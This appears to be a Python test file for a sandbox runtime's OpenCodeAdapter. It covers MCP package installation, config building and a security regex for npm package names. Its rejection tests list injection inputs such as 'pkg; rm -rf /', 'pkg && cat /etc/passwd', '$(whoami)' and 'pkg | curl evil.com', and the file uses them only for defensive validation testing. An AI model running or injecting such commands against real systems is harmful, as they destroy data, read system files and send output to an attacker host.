"""Tests for MCP server package installation and config building in OpenCodeAdapter."""

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from sandbox_runtime.adapters.opencode import OpenCodeAdapter


def _make_adapter() -> OpenCodeAdapter:
    """Create an OpenCodeAdapter for testing."""
    return OpenCodeAdapter()


# ─── _install_mcp_packages ──────────────────────────────────────────────────


class TestInstallMcpPackages:
    def _mock_proc(self, returncode=0):
        """Create a mock async subprocess with the given return code."""
        proc = AsyncMock()
        proc.communicate = AsyncMock(return_value=(b"", b""))
        proc.returncode = returncode
        proc.kill = MagicMock()
        proc.wait = AsyncMock()
        return proc

    async def test_extracts_package_from_npx_command(self):
        adapter = _make_adapter()
        servers = [{"type": "local", "command": ["npx", "-y", "@playwright/mcp"]}]
        mock_proc = self._mock_proc()
        with patch("asyncio.create_subprocess_exec", return_value=mock_proc) as mock_exec:
            await adapter._install_mcp_packages(servers)
            mock_exec.assert_called_once()
            args = mock_exec.call_args[0]
            assert list(args) == ["npm", "install", "-g", "@playwright/mcp"]

    async def test_extracts_package_from_npx_p_flag(self):
        adapter = _make_adapter()
        servers = [{"type": "local", "command": ["npx", "-p", "@scope/pkg", "binary"]}]
        mock_proc = self._mock_proc()
        with patch("asyncio.create_subprocess_exec", return_value=mock_proc) as mock_exec:
            await adapter._install_mcp_packages(servers)
            args = mock_exec.call_args[0]
            assert list(args) == ["npm", "install", "-g", "@scope/pkg"]

    async def test_skips_remote_servers(self):
        adapter = _make_adapter()
        servers = [{"type": "remote", "url": "https://mcp.example.com", "command": ["npx", "x"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await adapter._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_skips_servers_without_npx(self):
        adapter = _make_adapter()
        servers = [{"type": "local", "command": ["node", "server.js"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await adapter._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_skips_servers_without_command(self):
        adapter = _make_adapter()
        servers = [{"type": "local"}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await adapter._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_rejects_invalid_package_names(self):
        adapter = _make_adapter()
        servers = [{"type": "local", "command": ["npx", "../../../etc/passwd"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await adapter._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_rejects_shell_metacharacters(self):
        adapter = _make_adapter()
        servers = [{"type": "local", "command": ["npx", "pkg; rm -rf /"]}]
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await adapter._install_mcp_packages(servers)
            mock_exec.assert_not_called()

    async def test_deduplicates_packages(self):
        adapter = _make_adapter()
        servers = [
            {"type": "local", "command": ["npx", "-y", "@playwright/mcp"]},
            {"type": "local", "command": ["npx", "@playwright/mcp"]},
        ]
        mock_proc = self._mock_proc()
        with patch("asyncio.create_subprocess_exec", return_value=mock_proc) as mock_exec:
            await adapter._install_mcp_packages(servers)
            args = mock_exec.call_args[0]
            # Should only have one instance of @playwright/mcp
            assert list(args) == ["npm", "install", "-g", "@playwright/mcp"]

    async def test_noop_when_no_servers(self):
        adapter = _make_adapter()
        with patch("asyncio.create_subprocess_exec") as mock_exec:
            await adapter._install_mcp_packages([])
            mock_exec.assert_not_called()


# ─── _build_mcp_config ──────────────────────────────────────────────────────


class TestBuildMcpConfig:
    def test_builds_local_config_from_local_server(self):
        adapter = _make_adapter()
        servers = [
            {
                "name": "playwright",
                "type": "local",
                "command": ["npx", "-y", "@playwright/mcp"],
                "env": {"DEBUG": "1"},
            }
        ]
        config = adapter._build_mcp_config(servers)
        assert "playwright" in config
        assert config["playwright"]["type"] == "local"
        assert config["playwright"]["command"] == ["npx", "-y", "@playwright/mcp"]
        assert config["playwright"]["environment"] == {"DEBUG": "1"}

    def test_builds_remote_config_from_remote_server(self):
        adapter = _make_adapter()
        servers = [
            {
                "name": "remote-api",
                "type": "remote",
                "url": "https://mcp.example.com/sse",
                "headers": {"Authorization": "Bearer sk-test"},
            }
        ]
        config = adapter._build_mcp_config(servers)
        assert "remote-api" in config
        assert config["remote-api"]["type"] == "remote"
        assert config["remote-api"]["url"] == "https://mcp.example.com/sse"
        assert config["remote-api"]["headers"] == {"Authorization": "Bearer sk-test"}

    def test_falls_back_to_env_for_remote_headers(self):
        """Legacy compat: if 'headers' is absent, use 'env' for remote servers."""
        adapter = _make_adapter()
        servers = [
            {
                "name": "legacy-remote",
                "type": "remote",
                "url": "https://mcp.example.com",
                "env": {"Authorization": "Bearer old-token"},
            }
        ]
        config = adapter._build_mcp_config(servers)
        assert config["legacy-remote"]["headers"] == {"Authorization": "Bearer old-token"}

    def test_skips_servers_without_name(self):
        adapter = _make_adapter()
        servers = [{"type": "local", "command": ["npx", "x"]}]
        config = adapter._build_mcp_config(servers)
        assert config == {}

    def test_omits_environment_when_env_is_empty(self):
        adapter = _make_adapter()
        servers = [{"name": "minimal", "type": "local", "command": ["npx", "x"]}]
        config = adapter._build_mcp_config(servers)
        assert "environment" not in config["minimal"]

    def test_omits_headers_when_empty(self):
        adapter = _make_adapter()
        servers = [{"name": "bare-remote", "type": "remote", "url": "https://mcp.example.com"}]
        config = adapter._build_mcp_config(servers)
        assert "headers" not in config["bare-remote"]


# ─── _NPM_PKG_RE validation ─────────────────────────────────────────────────


class TestNpmPackageRegex:
    """Test the security-critical regex that validates npm package names."""

    @pytest.fixture
    def regex(self):
        adapter = _make_adapter()
        return adapter._NPM_PKG_RE

    @pytest.mark.parametrize(
        "pkg",
        [
            "@playwright/mcp",
            "@scope/package",
            "simple-package",
            "package@1.0.0",
            "@scope/pkg@latest",
            "@scope/my.pkg",
            "my-pkg@1.2.3-beta.1",
        ],
    )
    def test_accepts_valid_packages(self, regex, pkg):
        assert regex.match(pkg), f"Expected {pkg} to match"

    @pytest.mark.parametrize(
        "pkg",
        [
            "../../../etc/passwd",
            "pkg; rm -rf /",
            "pkg && cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "pkg | curl evil.com",
            "a b c",
        ],
    )
    def test_rejects_dangerous_inputs(self, regex, pkg):
        assert not regex.match(pkg), f"Expected {pkg} to NOT match"
